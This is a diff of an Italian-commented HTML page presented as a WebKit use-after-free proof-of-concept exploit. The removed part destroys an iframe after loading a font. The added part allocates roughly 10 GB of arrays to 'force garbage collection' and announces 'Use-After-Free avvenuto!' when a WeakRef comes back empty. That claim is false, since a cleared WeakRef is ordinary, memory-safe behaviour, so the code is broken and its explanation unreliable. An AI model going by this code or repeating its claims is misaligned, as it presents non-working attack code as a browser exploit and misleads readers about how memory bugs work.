@@ -1,63 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Use-After-Free</title>
+    <title>WebKit PoC Exploit</title>
     <style>
-        /* Caricamento font vulnerabile */
         @font-face {
             font-family: 'uaf';
-            src: url(a.ttf);
+            src: url(a.ttf); /* File font da caricare */
         }
         body {
             font-family: 'uaf';
         }
-    </style>
-    <script>
-        // Funzione per forzare il caricamento del font
-        function triggerUAF() {
-            try {
-                // Crea un iframe per isolare il contesto
-                let iframe = document.createElement('iframe');
-                document.body.appendChild(iframe);
-                
-                // Carica il font in una nuova finestra
-                let doc = iframe.contentDocument;
-                let style = doc.createElement('style');
-                style.textContent = `
-                    @font-face {
-                        font-family: 'uaf';
-                        src: url('a.ttf');
-                    }
-                    body {
-                        font-family: 'uaf';
-                    }
-                `;
-                doc.head.appendChild(style);
-                doc.body.innerHTML = "<div>Loading...</div>";
-
-                // Distruggi l'iframe per forzare il GC (Garbage Collection)
-                setTimeout(() => {
-                    document.body.removeChild(iframe);
-                    console.log("Iframe distrutto, possibile trigger UAF.");
-                }, 10);
-
-                alert("Font trigger completato!");
-            } catch (e) {
-                console.error("Errore: ", e);
-            }
+        button {
+            background-color: purple; /* Cambiato colore in viola */
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
         }
-
-        // Avvia l'exploit
-        window.onload = function() {
-            alert("Avvio PoC Use-After-Free");
-            triggerUAF();
-        };
-    </script>
+    </style>
 </head>
 <body>
-    <h1>PoC DocumentFontLoader UAF</h1>
-    <button onclick="triggerUAF()" style="background-color: blue; color: white; padding: 10px;">
-        Avvia Exploit
-    </button>
+    <h1>WebKit Exploit PoC</h1>
+    <button id="startExploit" onclick="startExploit()">Avvia Exploit</button>
+
+    <script>
+        function forceGC() {
+            // Forza il Garbage Collector
+            let bigArray = [];
+            for (let i = 0; i < 10000; i++) {
+                bigArray.push(new Uint8Array(1024 * 1024));
+            }
+            bigArray = null;
+            alert("Garbage Collection forzata.");
+        }
+
+        function triggerUAF() {
+            let obj = { key: 123 };
+            let weakRef = new WeakRef(obj);
+
+            setTimeout(() => {
+                obj = null; // Rimuove il riferimento all'oggetto
+                forceGC();
+
+                setTimeout(() => {
+                    try {
+                        let invalid = weakRef.deref();
+                        if (!invalid) {
+                            alert("Use-After-Free avvenuto!");
+                        } else {
+                            alert("Oggetto ancora valido: " + JSON.stringify(invalid));
+                        }
+                    } catch (e) {
+                        alert("Errore rilevato: " + e.message);
+                    }
+                }, 100);
+            }, 100);
+        }
+
+        function startExploit() {
+            alert("Avvio exploit...");
+            triggerUAF();
+        }
+    </script>
 </body>
 </html>
